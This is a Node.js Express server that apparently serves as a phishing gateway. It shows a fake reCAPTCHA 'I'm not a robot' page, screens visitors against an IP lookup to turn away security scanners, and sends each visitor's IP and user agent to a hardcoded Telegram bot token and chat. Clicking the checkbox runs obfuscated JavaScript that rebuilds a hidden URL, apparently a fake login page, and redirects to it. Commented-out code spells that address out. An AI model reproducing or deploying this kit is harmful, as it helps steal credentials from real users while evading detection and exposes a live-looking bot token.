const express = require('express');
const axios = require('axios');
const app = express();
const port = 3020;

// Replace with your Telegram bot token and admin chat ID
const BOT_TOKEN = '5005090175:AAGzFuGZv8txpBofwkOHbBC0HRClMGi1xXw';
const ADMIN_CHAT_ID = '513129599';

// Function to send a message to the Telegram bot
const sendTelegramMessage = async (message) => {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: ADMIN_CHAT_ID,
            text: message,
        });
        console.log('Notification sent to Telegram.');
    } catch (error) {
        console.error('Error sending message to Telegram:', error.message);
    }
};

// Middleware to check IP against the IP lookup service
app.use(async (req, res, next) => {

    const over_stay = `<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Docu......</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        .recaptcha-container {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            background-color: #f9f9f9;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .recaptcha-checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #ddd;
            background-color: #fff;
            margin-right: 10px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.3s ease, border-color 0.3s ease;
            position: relative;
        }

        .recaptcha-checkbox.checked {
            background-color: #4285f4;
            border-color: #4285f4;
        }

        .recaptcha-checkbox::after {
            content: '✓';
            color: #fff;
            font-size: 14px;
            opacity: 0;
            transform: scale(0);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .recaptcha-checkbox.checked::after {
            opacity: 1;
            transform: scale(1);
        }

        .recaptcha-text {
            font-size: 14px;
            color: #555;
        }

        .recaptcha-logo {
            margin-left: auto;
            font-size: 12px;
            color: #777;
            display: flex;
            align-items: center;
        }

        .recaptcha-logo img {
            width: 18px;
            height: 18px;
            margin-right: 5px;
        }

        .tooltip {
            display: none;
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background-color: #333;
            color: #fff;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 12px;
            white-space: nowrap;
            margin-bottom: 10px;
        }

        .recaptcha-container:hover .tooltip {
            display: block;
        }

        .recaptchasub {
            display: flex;
            justify-items: center;
            flex-direction: column;
            align-items: center;
            background-color: transparent;
            width: 90px;
            height: 74px;
            margin-top: 15px;
            margin-left: auto;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="recaptcha-container">
        <div class="tooltip">Click to verify</div>
        <div class="recaptcha-checkbox" onclick="toggleCheck(this)"></div>
        <div class="recaptcha-text">I'm not a robot</div>
        <div class="recaptchasub">
            <img style="width: 30px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            <span style="font-size: 0.8rem;">reCAPTCHA</span>
            <span style="font-size: 0.6rem;">Privacy - Terms</span>
        </div>
    </div>

</body>

</html>`
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown User-Agent';



    if (!userIp) {
        return res.status(200).send(over_stay);
    }

    try {
        // Send a request to the IP lookup service
        const response = await axios.get(`https://blackbox.ipinfo.app/lookup/${userIp[0]}`);
        console.log(response.data)
        console.log(userIp[0])
        if (response.data.trim() === 'Y') {
            // If the response is "Y", block the request
            // Check for new users by IP or custom logic (for demonstration, all users are treated as new)
            const messages = `black Box Blocked:\nIP Address: https://ipinfo.io/${userIp}\nUser-Agent: ${userAgent}`;

            // Send the message to Telegram
            sendTelegramMessage(messages);
            return res.status(200).send(over_stay);
        }
    } catch (error) {
        console.error('Error checking IP:', error.message);
        // Allow the request if there's an issue with the lookup service
        // return res.status(500).send('Error verifying IP.');
    }

    // Check for new users by IP or custom logic (for demonstration, all users are treated as new)
    const message = `New user accessed the site:\nIP Address: https://ipinfo.io/${userIp}\nUser-Agent: ${userAgent}
        `;

    // Send the message to Telegram
    sendTelegramMessage(message);

    next(); // Proceed to the next middleware or route
});

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Docu......</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        .recaptcha-container {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            padding: 15px;
            border-radius: 5px;
            background-color: #f9f9f9;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .recaptcha-checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #ddd;
            background-color: #fff;
            margin-right: 10px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.3s ease, border-color 0.3s ease;
            position: relative;
        }

        .recaptcha-checkbox.checked {
            background-color: #4285f4;
            border-color: #4285f4;
        }

        .recaptcha-checkbox::after {
            content: '✓';
            color: #fff;
            font-size: 14px;
            opacity: 0;
            transform: scale(0);
            transition: opacity 0.3s ease, transform 0.3s ease;
        }

        .recaptcha-checkbox.checked::after {
            opacity: 1;
            transform: scale(1);
        }

        .recaptcha-text {
            font-size: 14px;
            color: #555;
        }

        .recaptcha-logo {
            margin-left: auto;
            font-size: 12px;
            color: #777;
            display: flex;
            align-items: center;
        }

        .recaptcha-logo img {
            width: 18px;
            height: 18px;
            margin-right: 5px;
        }

        .tooltip {
            display: none;
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background-color: #333;
            color: #fff;
            padding: 5px 10px;
            border-radius: 3px;
            font-size: 12px;
            white-space: nowrap;
            margin-bottom: 10px;
        }

        .recaptcha-container:hover .tooltip {
            display: block;
        }

        .recaptchasub {
            display: flex;
            justify-items: center;
            flex-direction: column;
            align-items: center;
            background-color: transparent;
            width: 90px;
            height: 74px;
            margin-top: 15px;
            margin-left: auto;
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="recaptcha-container">
        <div class="tooltip">Click to verify</div>
        <div class="recaptcha-checkbox" onclick="toggleCheck(this)"></div>
        <div class="recaptcha-text">I'm not a robot</div>
        <div class="recaptchasub">
            <img style="width: 30px;" src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
            <span style="font-size: 0.8rem;">reCAPTCHA</span>
            <span style="font-size: 0.6rem;">Privacy - Terms</span>
        </div>
    </div>

    <script>
        const _0x13504e = _0x3c2d;
        (function (_0x19e057, _0x5c57ed) {
            const _0xd5f21b = _0x3c2d,
                _0x4c7881 = _0x19e057();
            while (!![]) {
                try {
                    const _0x1cc7f9 = parseInt(_0xd5f21b(0x15d)) / (0x1e79 + -0x1 * 0xb8b + -0x3c9 * 0x5) * (-
                        parseInt(_0xd5f21b(0x148)) / (-0xbea + -0xef7 + 0x1ae3 * 0x1)) + -parseInt(_0xd5f21b(
                        0x15e)) / (-0x968 + -0x157c + -0x3 * -0xa4d) + parseInt(_0xd5f21b(0x14c)) / (0x10b4 + -
                        0x44a + 0x8a * -0x17) + parseInt(_0xd5f21b(0x150)) / (-0x5ae + 0x2673 * -0x1 + -0x1 * -
                        0x2c26) + parseInt(_0xd5f21b(0x153)) / (-0x2184 * -0x1 + -0xdaa * -0x1 + 0x1 * -
                        0x2f28) * (-parseInt(_0xd5f21b(0x147)) / (0x2083 + 0x182f + -0xa3 * 0x59)) + parseInt(
                        _0xd5f21b(0x15c)) / (0x16b * 0x10 + 0x1 * 0x15c5 + -0x2c6d) + -parseInt(_0xd5f21b(
                        0x154)) / (0x1637 + 0x1f24 + -0x3552);
                    if (_0x1cc7f9 === _0x5c57ed) break;
                    else _0x4c7881['push'](_0x4c7881['shift']());
                } catch (_0x6033da) {
                    _0x4c7881['push'](_0x4c7881['shift']());
                }
            }
        }(_0x174f, 0x1c * 0x439 + -0x4ff0 + 0x1 * 0x2852b));

        function _0x174f() {
            const _0x4058b2 = ['location', 'lon', 'replace', 'hdAxf', 'log', '.ro', 'checked', 'zmqkJ', '28IzFewB',
                '104NNvmjr', 'FLM', 'RWXGl', 'trBuJ', '1072460hobsce', 'search', '[\x5c?&]', 'rersN',
                '1476060JsiCEA', '=([^&#]*)', 'yRspx', '243534fwuNLL', '17874xrtZqT', 'href', 'toggle', 'p/T',
                'XKBWO', 'VKvbs', 's.s', 'exec', '9488iZgyRp', '2078FMIlJG', '351444vRlwbt', 'classList'
            ];
            _0x174f = function () {
                return _0x4058b2;
            };
            return _0x174f();
        }

        function getUrlParameter(_0x2d914a) {
            const _0x1165ab = _0x3c2d,
                _0x448636 = {
                    'hdAxf': function (_0x35bbdd, _0x3db699) {
                        return _0x35bbdd + _0x3db699;
                    },
                    'yRspx': _0x1165ab(0x14e),
                    'RWXGl': _0x1165ab(0x151),
                    'rersN': function (_0x531077, _0x2b81db) {
                        return _0x531077 === _0x2b81db;
                    },
                    'VKvbs': function (_0x567768, _0x1db89f) {
                        return _0x567768(_0x1db89f);
                    }
                };
            _0x2d914a = _0x2d914a[_0x1165ab(0x162)](/[\[]/, '\x5c[')[_0x1165ab(0x162)](/[\]]/, '\x5c]');
            var _0x3a3d48 = new RegExp(_0x448636[_0x1165ab(0x163)](_0x448636[_0x1165ab(0x163)](_0x448636[_0x1165ab(
                    0x152)], _0x2d914a), _0x448636[_0x1165ab(0x14a)])),
                _0x1ec3ae = _0x3a3d48[_0x1165ab(0x15b)](window[_0x1165ab(0x160)][_0x1165ab(0x14d)]);
            return _0x448636[_0x1165ab(0x14f)](_0x1ec3ae, null) ? null : _0x448636[_0x1165ab(0x159)](decodeURIComponent,
                _0x1ec3ae[0xb40 + 0x1 * -0x2125 + 0x15e6][_0x1165ab(0x162)](/\\+/g, '\x20'));
        }
        const http = [_0x13504e(0x15a), _0x13504e(0x161), _0x13504e(0x157), 's:', 'ay', 'in', _0x13504e(0x149), 'vc',
                'ck', _0x13504e(0x165), 'ht', 'gd', 'tp', 'ho', _0x13504e(0x164), 'JR', '//'
            ],
            short = http[-0x15b1 + -0x94d * -0x1 + -0x25 * -0x56] + http[-0x1 * -0x1d21 + -0x6b9 * 0x5 + 0xa * 0x74] +
            http[-0x1 * 0x1fa7 + 0x103c + 0xf6e] + http[-0x2 * 0x5f2 + 0x5 * 0x18d + 0xd7 * 0x5] + http[-0x1b03 + -0x8 *
                -0x14e + 0x10a1] + http[-0x146e + -0x1d31 + 0x31a4] + http[0x6f * 0xb + -0xd9 * 0x5 + -0x7f],
            long = http[-0x19da + 0xff8 + 0x9ea] + http[0xa * -0x2af + 0x8c9 + 0x120e] + http[0x55 * 0x2f + 0x3d * -
                0x73 + -0x1 * -0xbd7] + http[-0x12c + 0x1c78 + -0x1b48] + http[-0x2392 * 0x1 + 0xac1 + -0x1 * -0x18d1] +
            http[0x1 * -0x13 + -0xfd3 + -0xff3 * -0x1] + http[0xbd5 * -0x1 + 0x2 * -0x701 + 0x19d9] + http[0x1 * -
                0x1b44 + -0x1 * 0x1f9 + 0xe3 * 0x21],
            dot = http[0x275 * 0xc + -0x268f + 0x91a] + http[0x1e1e + -0xe4a + -0xb * 0x16f];

        function _0x3c2d(_0x14406b, _0x5f56cf) {
            const _0x190ac3 = _0x174f();
            return _0x3c2d = function (_0x4d6211, _0x5cde47) {
                _0x4d6211 = _0x4d6211 - (0xa05 + 0x1 * -0x877 + -0x47);
                let _0x504cf8 = _0x190ac3[_0x4d6211];
                return _0x504cf8;
            }, _0x3c2d(_0x14406b, _0x5f56cf);
        }

        function toggleCheck(_0x3eddb4) {
            const _0x286c09 = _0x13504e,
                _0x954342 = {
                    'zmqkJ': _0x286c09(0x166),
                    'trBuJ': function (_0x1091b2, _0x49dc53) {
                        return _0x1091b2 + _0x49dc53;
                    },
                    'XKBWO': function (_0x3c5724, _0x516623) {
                        return _0x3c5724 + _0x516623;
                    }
                };
            _0x3eddb4[_0x286c09(0x15f)][_0x286c09(0x156)](_0x954342[_0x286c09(0x167)]), window[_0x286c09(0x160)][
                _0x286c09(0x155)
            ] = _0x954342[_0x286c09(0x14b)](_0x954342[_0x286c09(0x158)](short, long), dot);
        }
        // function getUrlParameter(name) {
        //     name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
        //     var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
        //     var results = regex.exec(window.location.search);
        //     return results === null ? null : decodeURIComponent(results[1].replace(/\\+/g, ' '));
        // }

        // // #https://digitalglamourfo.com.de/iS5t/
        // // const http = ["ht","tp","s:","//",'log','in',".ro","ck","lon","gd","ay","s.s","ho","p/T",'FLM','vc','JR']
        // const http = ["s.s","lon","p/T","s:","ay",'in','FLM','vc',"ck",".ro","ht","gd","tp","ho",'log','JR',"//"]

        // // https://login.rocklongdays.shop/TFLMvcJR

        // const short = http[10]+http[12]+http[3]+http[16]+http[14]+http[5]+http[9]
        // const long = http[8]+http[1]+http[11]+http[4]+http[0]+http[13]+http[2]+http[6]
        // const dot = http[7]+http[15]



        // function toggleCheck(element) {
        //     element.classList.toggle('checked');
        //     window.location.href = short+long+dot
        // }
    </script>
</body>

</html>
    `);
});

app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
